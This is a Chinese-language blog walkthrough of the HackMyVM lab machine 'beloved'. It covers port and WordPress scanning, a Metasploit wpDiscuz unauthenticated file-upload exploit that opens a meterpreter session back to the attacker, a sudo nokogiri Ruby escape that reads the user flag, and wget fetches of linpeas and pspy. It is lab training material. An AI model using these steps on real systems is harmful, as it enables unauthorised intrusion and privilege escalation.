<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>beloved | hackboy</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="beloved –hackmyvm1.扫描网段123456789101112131415┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-24 10:57 CSTNmap scan report for 192.168.56.1Hos">
<meta property="og:type" content="article">
<meta property="og:title" content="beloved">
<meta property="og:url" content="http://example.com/2023/07/24/beloved/index.html">
<meta property="og:site_name" content="hackboy">
<meta property="og:description" content="beloved –hackmyvm1.扫描网段123456789101112131415┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-24 10:57 CSTNmap scan report for 192.168.56.1Hos">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/pic/1.png">
<meta property="og:image" content="http://example.com/pic/2.png">
<meta property="og:image" content="http://example.com/pic/3.png">
<meta property="og:image" content="http://example.com/pic/4.png">
<meta property="article:published_time" content="2023-07-24T05:28:59.000Z">
<meta property="article:modified_time" content="2023-07-30T11:40:53.904Z">
<meta property="article:author" content="honkerZ">
<meta property="article:tag" content="hackmyvm">
<meta property="article:tag" content="msfs">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="chown">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/pic/1.png">
  
    <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">hackboy</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">hacking...</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-beloved" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/24/beloved/" class="article-date">
  <time class="dt-published" datetime="2023-07-24T05:28:59.000Z" itemprop="datePublished">2023-07-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      beloved
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <!---more--->


<h1 id="beloved-–hackmyvm"><a href="#beloved-–hackmyvm" class="headerlink" title="beloved –hackmyvm"></a>beloved –hackmyvm</h1><h2 id="1-扫描网段"><a href="#1-扫描网段" class="headerlink" title="1.扫描网段"></a>1.扫描网段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-24</span> <span class="number">10</span>:<span class="number">57</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.00040</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00019</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">7</span>E:<span class="number">11</span>:<span class="number">51</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.129</span></span><br><span class="line">Host is up (<span class="number">0.0018</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">01</span>:<span class="number">62</span>:<span class="number">6</span>D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.48</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.129</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-24</span> <span class="number">11</span>:<span class="number">05</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.129</span></span><br><span class="line">Host is up (<span class="number">0.0011</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span>+deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">2048</span> <span class="number">0</span>c3f13546e6ee656d291ebad9536c68d (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">9</span>be68e14397a17a38088cd772ec33b1a (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">855</span>a052a4bc0b236ea8ae28ab2efbcdf (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-title</span>: Beloved &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">| http<span class="literal">-robots</span>.txt: <span class="number">1</span> disallowed entry</span><br><span class="line">|_/wp<span class="literal">-admin</span>/</span><br><span class="line">|_http<span class="literal">-generator</span>: WordPress <span class="number">5.7</span>.<span class="number">2</span></span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">38</span> (Debian)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">01</span>:<span class="number">62</span>:<span class="number">6</span>D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">10.85</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="3-访问网页"><a href="#3-访问网页" class="headerlink" title="3.访问网页"></a>3.访问网页</h2><p><img src="/../pic/1.png" alt="image-20230724113901508"></p>
<p>发现wordpress,可能存在漏洞</p>
<h2 id="4-先扫一下目录"><a href="#4-先扫一下目录" class="headerlink" title="4.先扫一下目录"></a>4.先扫一下目录</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.129/ -x php,txt,html    </span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.129</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Extensions:              php,txt,html</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">11</span>:<span class="number">46</span>:<span class="number">26</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.html                (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/.php                 (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">/index.php            (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/]</span><br><span class="line">/rss                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/]</span><br><span class="line">/login                (Status: <span class="number">302</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">wp</span>-<span class="type">login.php</span>]</span><br><span class="line">/<span class="number">0</span>                    (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="number">0</span>/]</span><br><span class="line">/feed                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/]</span><br><span class="line">/atom                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/<span class="type">atom</span>/]</span><br><span class="line">/wp<span class="literal">-content</span>           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">321</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">wp</span>-<span class="type">content</span>/]</span><br><span class="line">/admin                (Status: <span class="number">302</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">wp</span>-<span class="type">admin</span>/]</span><br><span class="line">/wp<span class="literal">-login</span>.php         (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">7054</span>]</span><br><span class="line">/rss2                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/]</span><br><span class="line">/license.txt          (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">19915</span>]</span><br><span class="line">/wp<span class="literal">-includes</span>          (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">322</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">wp</span>-<span class="type">includes</span>/]</span><br><span class="line">/wp<span class="literal">-register</span>.php      (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">wp</span>-<span class="type">login.php</span>?<span class="type">action</span>=<span class="type">register</span>]</span><br><span class="line">/javascript           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">321</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">javascript</span>/]</span><br><span class="line">/wp<span class="literal">-rss2</span>.php          (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="type">beloved</span>/<span class="type">feed</span>/]</span><br><span class="line">/rdf                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/<span class="type">feed</span>/<span class="type">rdf</span>/]</span><br><span class="line">/page1                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.129</span>/]</span><br><span class="line">/readme.html          (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">7345</span>]</span><br><span class="line">/robots.txt           (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">107</span>]</span><br><span class="line">/<span class="string">&#x27;                    (Status: 301) [Size: 0] [--&gt; http://192.168.56.129/]</span></span><br><span class="line"><span class="string">/dashboard            (Status: 302) [Size: 0] [--&gt; http://beloved/wp-admin/]</span></span><br><span class="line"><span class="string">/%20                  (Status: 301) [Size: 0] [--&gt; http://192.168.56.129/]</span></span><br><span class="line"><span class="string">/wp-admin             (Status: 301) [Size: 319] [--&gt; http://192.168.56.129/wp-admin/]</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>发现beloved的站点很多</p>
<p>存储扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/../pic/2.png" alt="image-20230724120437325"></p>
<h2 id="5-wpscan扫一下"><a href="#5-wpscan扫一下" class="headerlink" title="5.wpscan扫一下"></a>5.wpscan扫一下</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wpscan --url http://beloved --enumerate vt    </span></span><br></pre></td></tr></table></figure>

<p><img src="/../pic/3.png" alt="image-20230724120854995"></p>
<p>主题没有扫一下插件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wpscan --url http://beloved --enumerate vp</span></span><br></pre></td></tr></table></figure>

<p><img src="/../pic/4.png" alt="image-20230724121031955"></p>
<p>强力扫一下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wpscan --url http://beloved --plugins-detection aggressive -t 200</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: <span class="number">00</span>:<span class="number">20</span>:<span class="number">29</span> &lt;============================================================&gt; (<span class="number">103493</span> / <span class="number">103493</span>) <span class="number">100.00</span>% Time: <span class="number">00</span>:<span class="number">20</span>:<span class="number">29</span></span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">i</span>] <span class="title">Plugin</span></span>(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: http://beloved/wp<span class="literal">-content</span>/plugins/akismet/</span><br><span class="line"> | Latest Version: <span class="number">5.2</span></span><br><span class="line"> | Last Updated: <span class="number">2023</span><span class="literal">-06-21T14</span>:<span class="number">59</span>:<span class="number">00.000</span>Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/akismet/, status: <span class="number">403</span></span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] feed</span><br><span class="line"> | Location: http://beloved/wp<span class="literal">-content</span>/plugins/feed/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/feed/, status: <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] wpdiscuz</span><br><span class="line"> | Location: http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/</span><br><span class="line"> | Last Updated: <span class="number">2023</span><span class="literal">-06-03T12</span>:<span class="number">37</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | Readme: http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is <span class="number">7.6</span>.<span class="number">1</span></span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/, status: <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | Version: <span class="number">7.0</span>.<span class="number">4</span> (<span class="number">80</span>% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://beloved/wp<span class="literal">-content</span>/plugins/wpdiscuz/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: <span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span> &lt;===================================================================&gt; (<span class="number">137</span> / <span class="number">137</span>) <span class="number">100.00</span>% Time: <span class="number">00</span>:<span class="number">00</span>:<span class="number">02</span></span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability <span class="keyword">data</span> has not been output.</span><br><span class="line">[!] You can get a free API token with <span class="number">25</span> daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Jul <span class="number">24</span> <span class="number">12</span>:<span class="number">33</span>:<span class="number">51</span> <span class="number">2023</span></span><br><span class="line">[+] Requests Done: <span class="number">103650</span></span><br><span class="line">[+] Cached Requests: <span class="number">44</span></span><br><span class="line">[+] <span class="keyword">Data</span> Sent: <span class="number">26.335</span> MB</span><br><span class="line">[+] <span class="keyword">Data</span> Received: <span class="number">28.247</span> MB</span><br><span class="line">[+] Memory used: <span class="number">440.398</span> MB</span><br><span class="line">[+] Elapsed time: <span class="number">00</span>:<span class="number">20</span>:<span class="number">48</span></span><br></pre></td></tr></table></figure>

<p>发现三个插件：akismet,feed,wpdiscuz</p>
<p>其中wpdiscuz可以确定版本</p>
<h2 id="6-上msf-注：需要设置在同一个eth1中"><a href="#6-上msf-注：需要设置在同一个eth1中" class="headerlink" title="6.上msf(注：需要设置在同一个eth1中)"></a>6.上msf(注：需要设置在同一个eth1中)</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload</span><br><span class="line"><span class="built_in">set</span> blogpath /<span class="number">2021</span>/<span class="number">06</span>/hello<span class="literal">-world</span>/</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192.168</span>.<span class="number">56.129</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="7-下面进行提权："><a href="#7-下面进行提权：" class="headerlink" title="7.下面进行提权："></a>7.下面进行提权：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line"><span class="keyword">Process</span> <span class="number">2366</span> created.</span><br><span class="line">Channel <span class="number">0</span> created.</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www<span class="literal">-data</span> on beloved:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www<span class="literal">-data</span> may run the following commands on beloved:</span><br><span class="line">    (beloved) NOPASSWD: /usr/local/bin/nokogiri</span><br></pre></td></tr></table></figure>

<p>发现nokogiri不需要密码：尝试一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="literal">-u</span> beloved nokogiri /home/beloved</span><br><span class="line">/var/lib/gems/<span class="number">2.5</span>.<span class="number">0</span>/gems/nokogiri<span class="literal">-1</span>.<span class="number">11.7</span>/bin/nokogiri:<span class="number">98</span>:<span class="keyword">in</span> `read<span class="string">&#x27;: Is a directory @ io_fread - /home/beloved (Errno::EISDIR)</span></span><br><span class="line"><span class="string">        from /var/lib/gems/2.5.0/gems/nokogiri-1.11.7/bin/nokogiri:98:in `&lt;top (required)&gt;&#x27;</span></span><br><span class="line">        from /usr/local/bin/nokogiri:<span class="number">23</span>:<span class="keyword">in</span> `load<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/local/bin/nokogiri:23:in `&lt;main&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以读取文件：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="literal">-u</span> beloved nokogiri /home/beloved/user.txt</span><br><span class="line">Your document is stored <span class="keyword">in</span> @doc...</span><br><span class="line"><span class="keyword">Switch</span> to inspect mode.</span><br><span class="line"><span class="comment">#换个方法试试</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">        <span class="number">4</span>: from /usr/local/bin/nokogiri:<span class="number">23</span>:<span class="keyword">in</span> `&lt;main&gt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        3: from /usr/local/bin/nokogiri:23:in `load&#x27;</span></span><br><span class="line">        <span class="number">2</span>: from /var/lib/gems/<span class="number">2.5</span>.<span class="number">0</span>/gems/nokogiri<span class="literal">-1</span>.<span class="number">11.7</span>/bin/nokogiri:<span class="number">115</span>:<span class="keyword">in</span> `&lt;top (required)&gt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        1: from (irb):1</span></span><br><span class="line"><span class="string">NameError (undefined local variable or method `ls&#x27;</span> <span class="keyword">for</span> main:Object)</span><br></pre></td></tr></table></figure>

<p>发现是gems,是ruby</p>
<p>用exec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec &#x27;cat /home/beloved/user.txt&#x27;</span><br><span class="line">exec &#x27;cat /home/beloved/user.txt&#x27;</span><br><span class="line">020588f87676a40236192c324c1a57fc</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="8-提权至sudo"><a href="#8-提权至sudo" class="headerlink" title="8.提权至sudo"></a>8.提权至sudo</h2><p>尝试漏洞侵权</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-m</span> http.server</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.129</span>:<span class="number">8000</span>/linpeas.sh</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.129</span>:<span class="number">8000</span>/pspy64</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>

